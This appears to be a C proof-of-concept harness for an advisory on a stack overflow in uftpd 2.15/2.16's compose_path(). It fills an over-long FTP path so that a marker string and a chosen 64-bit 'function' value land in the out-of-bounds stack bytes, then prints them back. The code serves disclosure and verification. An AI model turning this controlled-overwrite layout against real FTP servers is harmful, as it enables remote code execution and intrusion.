/* Driver for the verbatim pinned upstream compose_path() (uftpd 2.15/2.16).
 *
 * Reproduces the non-chroot precondition from the advisory: `home` is the
 * configured FTP root (no trailing slash), chrooted == 0, and a logged-in FTP
 * client supplies a path that strlcat() caps at PATH_MAX-1.  compose_path()
 * then memmove()s that string right by strlen(home) bytes inside a local
 * dir[PATH_MAX] on the stack -- strlen(home) bytes past the end.
 *
 * The overflow tail is the tail of the attacker's path; chosen marker and
 * chosen 64-bit value are planted there so the instrumented checks can show
 * exactly which bytes the upstream memmove writes out of bounds.
 */
#include "uftpd.h"
#include <stdio.h>

char *home;
int chrooted = 0;

/* "UFTPD2SHELL!" */
static const unsigned char MAGIC[] = {
	0x55, 0x46, 0x54, 0x50, 0x44, 0x32, 0x53, 0x48, 0x45, 0x4c, 0x4c, 0x21
};
static const unsigned long long CHOSEN_FN = 0x1122334455667788ULL;

int main(int argc, char **argv)
{
	size_t over = (argc > 1) ? (size_t)atoi(argv[1]) : 128;
	const char *label = (argc > 2) ? argv[2] : "run";
	char *prefix, *path;
	unsigned long long readback;
	ctrl_t ctrl;
	size_t need, tail;
	char *r;

	if (over < 16 || over > 512)
		return 90;
	need = (size_t)PATH_MAX - 1;          /* strlcat(dst, ..., sizeof dir) cap */

	prefix = (char *)malloc(over + 1);
	memset(prefix, 'H', over);            /* configured home, no trailing '/' */
	prefix[over] = '\0';
	home = prefix;

	memset(&ctrl, 0, sizeof(ctrl));
	strcpy(ctrl.cwd, "/");

	path = (char *)malloc(need + 1);
	memset(path, 'A', need);
	path[need] = '\0';

	/* dir[0] is cwd[0] == '/', so dir[i+1] == path[i].  The OOB slice of
	 * dir is [PATH_MAX, PATH_MAX + over), i.e. path indices
	 * [PATH_MAX - over - 1, PATH_MAX - 2]. */
	tail = (size_t)PATH_MAX - over - 1;
	if (tail + 48 + sizeof(CHOSEN_FN) > need)
		return 91;
	memcpy(path + tail, MAGIC, sizeof(MAGIC));
	memcpy(path + tail + 40, &CHOSEN_FN, sizeof(CHOSEN_FN));

	printf("label=%s\n", label);
	printf("PATH_MAX=%d home_len=%zu path_len=%zu expected_oob=%zu\n",
	       PATH_MAX, strlen(home), strlen(path), over);
	printf("tail_path_off=%zu\n", tail);
	printf("chosen_marker=%02x%02x%02x%02x\n",
	       path[tail], path[tail + 1], path[tail + 2], path[tail + 3]);
	memcpy(&readback, path + tail + 40, sizeof(readback));
	printf("chosen_fn=0x%016llx\n", readback);
	fflush(stdout);

	r = compose_path(&ctrl, path);
	printf("returned=%s\n", r ? "nonnull" : "null");
	printf("chosen_readback=%02x%02x%02x%02x\n",
	       path[tail], path[tail + 1], path[tail + 2], path[tail + 3]);
	fflush(stdout);

	free(prefix);
	free(path);
	return 0;
}
